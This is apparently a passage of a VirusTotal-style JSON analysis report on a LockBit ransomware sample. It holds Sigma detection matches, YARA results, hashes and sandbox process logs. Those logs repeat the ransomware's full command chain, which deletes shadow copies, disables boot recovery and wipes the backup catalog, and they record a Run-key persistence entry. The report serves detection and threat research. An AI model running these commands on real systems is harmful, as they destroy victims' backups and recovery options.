                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-5896-643F-F005-000000003400}",
                                "ProcessId": "8456",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "WMI Commandline Utility",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-5894-643F-EB05-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EC80E603E0090B3AC3C1234C2BA43A0F,SHA256=D368BCB7934DB0C53D1E7277DCB47AF2B709253CBF0EEE9869EE7E17ED226EA3,IMPHASH=59A9108CA1CECC9147C5FBAB104EBF33",
                                "OriginalFileName": "wmic.exe",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "5924",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "wmic  shadowcopy delete ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873046",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-5899-643F-F505-000000003400}",
                                "ProcessId": "8660",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae BLB Backup",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-5894-643F-EB05-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EE1E2C4D42579B19D765420E07589148,SHA256=5897AF142FACD58CF3C919263612D81A2D052B8769EA73343CC123650C1EC410,IMPHASH=9A00B7A0CB1FA540BC07C0F8C801306A",
                                "OriginalFileName": "WBADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "5924",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "wbadmin  delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\wbadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873049",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58A8-643F-0806-000000003400}",
                                "ProcessId": "11184",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58A7-643F-0306-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11140",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  delete shadows /all /quiet ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873064",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58A9-643F-0F06-000000003400}",
                                "ProcessId": "11684",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58A9-643F-0B06-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11412",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681873065",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58A9-643F-1306-000000003400}",
                                "ProcessId": "11716",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "WMI Commandline Utility",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58A7-643F-0306-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EC80E603E0090B3AC3C1234C2BA43A0F,SHA256=D368BCB7934DB0C53D1E7277DCB47AF2B709253CBF0EEE9869EE7E17ED226EA3,IMPHASH=59A9108CA1CECC9147C5FBAB104EBF33",
                                "OriginalFileName": "wmic.exe",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11140",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wmic  shadowcopy delete ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873065",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58AE-643F-3206-000000003400}",
                                "ProcessId": "13072",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58AD-643F-2D06-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "12880",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681873070",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58AF-643F-4106-000000003400}",
                                "ProcessId": "13692",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae BLB Backup",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58A7-643F-0306-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EE1E2C4D42579B19D765420E07589148,SHA256=5897AF142FACD58CF3C919263612D81A2D052B8769EA73343CC123650C1EC410,IMPHASH=9A00B7A0CB1FA540BC07C0F8C801306A",
                                "OriginalFileName": "WBADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "11140",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wbadmin  delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\wbadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873071",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58B1-643F-4F06-000000003400}",
                                "ProcessId": "14760",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58B1-643F-4D06-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14684",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  delete shadows /all /quiet ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873073",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58B1-643F-5006-000000003400}",
                                "ProcessId": "14796",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "WMI Commandline Utility",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58B1-643F-4D06-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EC80E603E0090B3AC3C1234C2BA43A0F,SHA256=D368BCB7934DB0C53D1E7277DCB47AF2B709253CBF0EEE9869EE7E17ED226EA3,IMPHASH=59A9108CA1CECC9147C5FBAB104EBF33",
                                "OriginalFileName": "wmic.exe",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14684",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wmic  shadowcopy delete ",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873073",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58B2-643F-5306-000000003400}",
                                "ProcessId": "14876",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae BLB Backup",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58B1-643F-4D06-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=EE1E2C4D42579B19D765420E07589148,SHA256=5897AF142FACD58CF3C919263612D81A2D052B8769EA73343CC123650C1EC410,IMPHASH=9A00B7A0CB1FA540BC07C0F8C801306A",
                                "OriginalFileName": "WBADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14684",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "wbadmin  delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\wbadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "UtcTime": "1681873074",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58B2-643F-5806-000000003400}",
                                "ProcessId": "15044",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58B2-643F-5406-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14960",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681873074",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58B4-643F-7206-000000003400}",
                                "ProcessId": "14920",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Command Line Interface for Microsoft\\xae Volume Shadow Copy Service ",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58B4-643F-6E06-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=47D51216EF45075B5F7EAA117CC70E40,SHA256=C946C4EDA61355A1B8E134E7A184A15C9A358B9675B6172A83E4937AE9EF4B03,IMPHASH=C1EDC431CD345F0A0F32019895D13FCE",
                                "OriginalFileName": "VSSADMIN.EXE",
                                "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "14772",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "vssadmin  Delete Shadows /All /Quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\vssadmin.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "/c vssadmin Delete Shadows /All /Quiet",
                                "UtcTime": "1681873076",
                                "RuleName": "-"
                            }
                        }
                    ],
                    "rule_level": "high",
                    "rule_id": "ad5e4d4b939797a70a9aa742d979a4742c2cfedddd663fb1a43b2795c1e6054b",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "Shadow Copies Deletion Using Operating Systems Utilities",
                    "rule_description": "Shadow Copies deletion using operating systems utilities",
                    "rule_author": "Florian Roth (Nextron Systems), Michael Haag, Teymur Kheirkhabarov, Daniil Yugoslavskiy, oscd.community, Andreas Hunkeler (@Karneades)"
                },
                {
                    "match_context": [
                        {
                            "values": {
                                "EventID": "13",
                                "ProcessId": "6496",
                                "EventType": "SetValue",
                                "Image": "C:\\Users\\george\\Desktop\\software.exe",
                                "ProcessGuid": "{C784477D-5892-643F-E905-000000003400}",
                                "UtcTime": "1681873043",
                                "Details": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                                "RuleName": "T1060,RunKey",
                                "TargetObject": "HKU\\S-1-5-21-1015118539-3749460369-599379286-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\XO1XADpO01"
                            }
                        }
                    ],
                    "rule_level": "medium",
                    "rule_id": "8b5db9da5732dc549b0e8b56fe5933d7c95ed760f3ac20568ab95347ef8c5bcc",
                    "rule_source": "Sigma Integrated Rule Set (GitHub)",
                    "rule_title": "CurrentVersion Autorun Keys Modification",
                    "rule_description": "Detects modification of autostart extensibility point (ASEP) in registry.",
                    "rule_author": "Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)"
                },
                {
                    "match_context": [
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-5894-643F-EB05-000000003400}",
                                "ProcessId": "5924",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-5892-643F-E905-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "6496",
                                "CurrentDirectory": "C:\\Users\\george\\Desktop\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\"",
                                "UtcTime": "1681873044",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58A7-643F-0306-000000003400}",
                                "ProcessId": "11140",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58A4-643F-0006-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "10076",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\" ",
                                "UtcTime": "1681873063",
                                "RuleName": "-"
                            }
                        },
                        {
                            "values": {
                                "TerminalSessionId": "1",
                                "ProcessGuid": "{C784477D-58B1-643F-4D06-000000003400}",
                                "ProcessId": "14684",
                                "Product": "Microsoft\\xae Windows\\xae Operating System",
                                "Description": "Windows Command Processor",
                                "Company": "Microsoft Corporation",
                                "ParentProcessGuid": "{C784477D-58AC-643F-2606-000000003400}",
                                "User": "DESKTOP-B0T93D6\\george",
                                "Hashes": "MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE",
                                "OriginalFileName": "Cmd.Exe",
                                "ParentImage": "C:\\Users\\george\\Desktop\\software.exe",
                                "FileVersion": "10.0.17134.1 (WinBuild.160101.0800)",
                                "ParentProcessId": "12656",
                                "CurrentDirectory": "C:\\Windows\\system32\\",
                                "CommandLine": "\"C:\\Windows\\System32\\cmd.exe\" /c vssadmin delete shadows /all /quiet & wmic shadowcopy delete & bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no & wbadmin delete catalog -quiet",
                                "EventID": "1",
                                "LogonGuid": "C784477D-80E3-6407-B8AC-030000000000",
                                "LogonId": "240824",
                                "Image": "C:\\Windows\\System32\\cmd.exe",
                                "IntegrityLevel": "High",
                                "ParentCommandLine": "\"C:\\Users\\george\\Desktop\\software.exe\" ",
                                "UtcTime": "1681873073",
                                "RuleName": "-"
                            }
                        }
                    ],
                    "rule_level": "medium",
                    "rule_id": "f09d5248ed8fc1a93251158bfda71f8144ccaf37fa922416ccd897498bff7c55",
                    "rule_source": "SOC Prime Threat Detection Marketplace",
                    "rule_title": "Suspicious Process Creation",
                    "rule_description": "Detects suspicious process starts on Windows systems based on keywords",
                    "rule_author": "Florian Roth"
                }
            ],
            "tlsh": "T17EE32725F156E276C4E70BB07668CFF568E8A434232090F7DBED0A5C18E4BE16E37256",
            "detectiteasy": {
                "filetype": "PE32",
                "values": [
                    {
                        "info": "C",
                        "version": "19.16.27032",
                        "type": "Compiler",
                        "name": "Microsoft Visual C/C++"
                    },
                    {
                        "version": "14.10.25017",
                        "type": "Linker",
                        "name": "Microsoft Linker"
                    },
                    {
                        "version": "2017 version 15.0-15.2",
                        "type": "Tool",
                        "name": "Visual Studio"
                    }
                ]
            },
            "vhash": "015036656d51e3z12z3b0302231z37z60600165zb7z",
            "magika": "PEBIN",
            "trid": [
                {
                    "file_type": "Win32 Executable MS Visual C++ (generic)",
                    "probability": 37.8
                },
                {
                    "file_type": "Microsoft Visual C++ compiled executable (generic)",
                    "probability": 20.0
                },
                {
                    "file_type": "Win64 Executable (generic)",
                    "probability": 12.7
                },
                {
                    "file_type": "Win32 Dynamic Link Library (generic)",
                    "probability": 7.9
                },
                {
                    "file_type": "Win16 NE executable (generic)",
                    "probability": 6.1
                }
            ],
            "size": 151552,
            "crowdsourced_yara_results": [
                {
                    "ruleset_id": "00c3b8eb5d",
                    "rule_name": "INDICATOR_SUSPICIOUS_GENRansomware",
                    "ruleset_name": "indicator_suspicious",
                    "description": "Detects command variations typically used by ransomware",
                    "author": "ditekSHen",
                    "match_date": 1742758552,
                    "ruleset_version": "00c3b8eb5d|e76c93dcdedff04076380ffc60ea54e45b313635",
                    "source": "https://github.com/ditekshen/detection"
                },
                {
                    "ruleset_id": "00c3b8eb5d",
                    "rule_name": "INDICATOR_SUSPICIOUS_EXE_UACBypass_CMSTPCOM",
                    "ruleset_name": "indicator_suspicious",
                    "description": "Detects Windows exceutables bypassing UAC using CMSTP COM interfaces. MITRE (T1218.003)",
                    "author": "ditekSHen",
                    "match_date": 1742758552,
                    "ruleset_version": "00c3b8eb5d|e76c93dcdedff04076380ffc60ea54e45b313635",
                    "source": "https://github.com/ditekshen/detection"
                },
                {
                    "ruleset_id": "00c3b8eb5d",
                    "rule_name": "INDICATOR_SUSPICOUS_EXE_References_VEEAM",
                    "ruleset_name": "indicator_suspicious",
                    "description": "Detects executables containing many references to VEEAM. Observed in ransomware",
                    "author": "ditekSHen",
                    "match_date": 1742758552,
                    "ruleset_version": "00c3b8eb5d|e76c93dcdedff04076380ffc60ea54e45b313635",
                    "source": "https://github.com/ditekshen/detection"
                },
                {
                    "ruleset_id": "00c3b8eb5d",
                    "rule_name": "INDICATOR_SUSPICIOUS_ClearWinLogs",
                    "ruleset_name": "indicator_suspicious",
                    "description": "Detects executables containing commands for clearing Windows Event Logs",
                    "author": "ditekSHen",
                    "match_date": 1742758552,
                    "ruleset_version": "00c3b8eb5d|e76c93dcdedff04076380ffc60ea54e45b313635",
                    "source": "https://github.com/ditekshen/detection"
                },
                {
                    "ruleset_id": "00c3b8eb5d",
                    "rule_name": "INDICATOR_SUSPICIOUS_USNDeleteJournal",
                    "ruleset_name": "indicator_suspicious",
                    "description": "Detects executables containing anti-forensic artifcats of deletiing USN change journal. Observed in ransomware",
                    "author": "ditekSHen",
                    "source": "https://github.com/ditekshen/detection"
                },
                {
                    "ruleset_id": "00bc40da16",
                    "rule_name": "Lockbit",
                    "ruleset_name": "Lockbit",
                    "description": "Lockbit Payload",
                    "author": "kevoreilly",
                    "match_date": 1742758552,
                    "ruleset_version": "00bc40da16|b488c511a7c48ed6c425bf38811bf08e87b0ddbf",
                    "source": "https://github.com/kevoreilly/CAPEv2"
                },
                {
                    "ruleset_id": "0080597496",
                    "rule_name": "win_lockbit_auto",
                    "ruleset_name": "win.lockbit_auto",
                    "description": "Detects win.lockbit.",
                    "author": "Felix Bilstein - yara-signator at cocacoding dot com",
                    "match_date": 1742758552,
                    "ruleset_version": "0080597496|6558c417dcf07146b1309b6acde6be0aa96dea10",
                    "source": "https://malpedia.caad.fkie.fraunhofer.de/"
                }
            ],
            "sha1": "8fab511405f29d3194658b1642875e8c582a0a60",
            "magic": "PE32 executable (GUI) Intel 80386, for MS Windows",
            "reputation": -67,
            "meaningful_name": "Lockbit.exe",
            "tags": [
                "direct-cpu-clock-access",
                "peexe",
                "checks-network-adapters",
                "persistence",
                "overlay",
                "runtime-modules",
                "long-sleeps",
                "calls-wmi",
                "detect-debug-environment"
            ],
            "last_analysis_date": 1742758551,
            "filecondis": {
                "raw_md5": "2d8145fe6e504d4f6a8ec4e9717fa8fa",
                "dhash": "7e7a3c1e0e1d5800"
            },
            "last_modification_date": 1751278777,
            "type_description": "Win32 EXE"
        }
    }
}